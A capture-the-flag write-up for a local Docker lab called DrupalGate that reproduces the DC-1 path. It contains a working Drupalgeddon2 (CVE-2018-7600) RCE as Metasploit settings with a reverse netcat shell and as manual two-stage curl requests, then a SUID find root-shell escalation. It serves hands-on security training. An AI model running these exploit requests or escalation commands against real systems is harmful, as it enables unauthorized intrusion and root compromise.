# DrupalGate Docker CTF Detailed Writeup

## Overview

DrupalGate is an easy boot2root CTF machine inspired by the original VulnHub DC-1 Drupal attack path. The machine is designed for an ethical, controlled lab environment where players practice enumeration, web exploitation, Linux post-exploitation, and privilege escalation.

The intended path is:

1. Discover exposed services.
2. Identify a Drupal 7 web application.
3. Use a Drupalgeddon2-style unauthenticated RCE to get command execution as `www-data`.
4. Upgrade or stabilize the shell.
5. Enumerate local privilege escalation paths.
6. Find that `/usr/bin/find` has the SUID bit set.
7. Abuse SUID `find` to read the final root flag.

Flags use the `HackCTF{...}` format.

## Lab Information

When run with the included `docker-compose.yml`, the services are exposed on localhost:

```text
HTTP:  http://127.0.0.1:8080
SSH:   127.0.0.1:2222
RPC:   127.0.0.1:1111
```

Start the machine:

```bash
docker compose up --build -d
```

Check status:

```bash
docker compose ps
```

Expected result:

```text
drupalgate-lab   Up   0.0.0.0:8080->80/tcp, 0.0.0.0:2222->22/tcp, 0.0.0.0:1111->111/tcp
```

## 1. Enumeration

Start with a service scan. Because this Docker version maps the original internal service ports to host ports, scan the host-mapped ports:

```bash
nmap -sV -p 1111,2222,8080 127.0.0.1
```

Expected services:

```text
1111/tcp open  tcpwrapped
2222/tcp open  ssh      OpenSSH 8.4p1 Debian
8080/tcp open  http     Apache httpd 2.4.54
```

The important discovery is HTTP on port `8080`. Open it in a browser:

```text
http://127.0.0.1:8080/
```

The page looks like a public-sector Drupal site called `Denton Community Services`. It has normal Drupal-like features such as:

- Drupal generator metadata
- Login block
- Password reset page
- Search block
- Menu navigation
- Public resource links
- Drupal release notes

Check the source or fetch the page:

```bash
curl -s http://127.0.0.1:8080/ | grep -i drupal
```

Expected evidence:

```html
<meta name="Generator" content="Drupal 7 (http://drupal.org)">
Powered by Drupal
```

Also check the changelog:

```bash
curl -s http://127.0.0.1:8080/CHANGELOG.txt
```

Expected evidence:

```text
Drupal 7.57, 2018-02-21
Fixed security issues. See SA-CORE-2018-001.
```

At this point, the target should trigger the idea to test for Drupalgeddon2-style exploitation.

## 2. Exploitation

Drupalgeddon2, tracked as CVE-2018-7600, affected Drupal installations through a dangerous form API behavior that could lead to unauthenticated remote code execution.

This CTF target intentionally implements a Drupal 7 compatible vulnerable request flow for training purposes.

### Metasploit Option

In Metasploit, use:

```text
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 127.0.0.1
set RPORT 8080
set TARGETURI /
set TARGET Drupal 7.x
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <your-local-listener-ip>
run
```

If your Metasploit target list uses exact names, choose the Drupal 7 Unix in-memory or command payload target.

After exploitation, verify the user:

```bash
whoami
id
```

Expected user:

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Manual RCE Check

You can also verify the vulnerable flow manually. Stage one creates a Drupal form build ID:

```bash
resp=$(curl -g -s -X POST \
  'http://127.0.0.1:8080/?q=user/password&name[#post_render][]=passthru&name[#markup]=id&name[#type]=markup' \
  -d 'form_id=user_pass&_triggering_element_name=name')

form_id=$(printf '%s' "$resp" | sed -n 's/.*name="form_build_id" value="\([^"]*\)".*/\1/p')
printf '%s\n' "$form_id"
```

Stage two executes the stored callback:

```bash
curl -s -X POST \
  "http://127.0.0.1:8080/?q=file/ajax/name/%23value/$form_id" \
  -d "form_build_id=$form_id"
```

Expected output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. Shell Stabilization

If you have a reverse shell, stabilize it with Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Depending on your terminal, you can also background the shell with `Ctrl+Z`, run `stty raw -echo; fg`, and press Enter.

## 4. User Flag

From the `www-data` shell, enumerate local users and home directories:

```bash
ls -la /home
ls -la /home/flaguser
```

Read the user flag:

```bash
cat /home/flaguser/flag1.txt
```

Expected flag:

```text
HackCTF{welcome_to_drupalgate}
```

## 5. Privilege Escalation Enumeration

A common beginner-friendly Linux privilege escalation check is to search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Interesting result:

```text
/usr/bin/find
```

The SUID bit means the binary runs with the effective permissions of its owner. Since `/usr/bin/find` is owned by root and has SUID set, commands executed through it can run with effective root privileges.

Confirm permissions:

```bash
ls -l /usr/bin/find
```

Expected style of output:

```text
-rwsr-xr-x 1 root root ... /usr/bin/find
```

The `s` in the owner execute position shows the SUID bit.

## 6. Root Shell With SUID find

Move to a writable directory and create a target file:

```bash
cd /tmp
touch drupalgate
```

Use `find` to spawn a privileged shell:

```bash
/usr/bin/find drupalgate -exec /bin/bash -p \; -quit
```

The `-p` option tells Bash to preserve effective privileges. Without `-p`, Bash may drop the elevated effective UID.

Check identity:

```bash
id
```

Expected result:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Even though the real UID is still `www-data`, the effective UID is root, which is enough to read root-owned files.

## 7. Root Flag

Read the final flag:

```bash
cat /root/thefinalflag.txt
```

Expected flag:

```text
HackCTF{drupalgate_rooted_with_suid_find}
```

## 8. Full Validation Commands

These are useful for challenge authors to confirm the machine still works.

Check exposed ports:

```bash
for port in 8080 2222 1111; do nc -z 127.0.0.1 "$port" && echo "$port open"; done
```

Check Drupal fingerprints:

```bash
curl -s http://127.0.0.1:8080/ | grep -E 'Generator|Denton Community Services|Powered by Drupal'
curl -s http://127.0.0.1:8080/CHANGELOG.txt | grep -E 'Drupal 7\.57|SA-CORE-2018-001'
```

Check RCE:

```bash
resp=$(curl -g -s -X POST \
  'http://127.0.0.1:8080/?q=user/password&name[#post_render][]=passthru&name[#markup]=id&name[#type]=markup' \
  -d 'form_id=user_pass&_triggering_element_name=name')
form_id=$(printf '%s' "$resp" | sed -n 's/.*name="form_build_id" value="\([^"]*\)".*/\1/p')
curl -s -X POST "http://127.0.0.1:8080/?q=file/ajax/name/%23value/$form_id" -d "form_build_id=$form_id"
```

Check privilege escalation from inside the container:

```bash
docker exec -u www-data drupalgate-lab /usr/bin/find /tmp -maxdepth 0 \
  -exec /bin/bash -p -c 'id; cat /root/thefinalflag.txt' \;
```

## 9. Cleanup and Reset

Stop the machine:

```bash
docker compose down
```

Reset and rebuild from a clean state:

```bash
docker compose down -v
docker compose up --build -d
```

## Notes for CTF Operators

This machine intentionally contains vulnerable behavior. Do not expose it directly to the public internet. Run it on localhost, a private CTF network, or an isolated training environment.

The web application is intentionally Drupal-compatible rather than a full Drupal CMS install. This keeps the challenge small, deterministic, and reliable while preserving the expected DC-1 learning path.
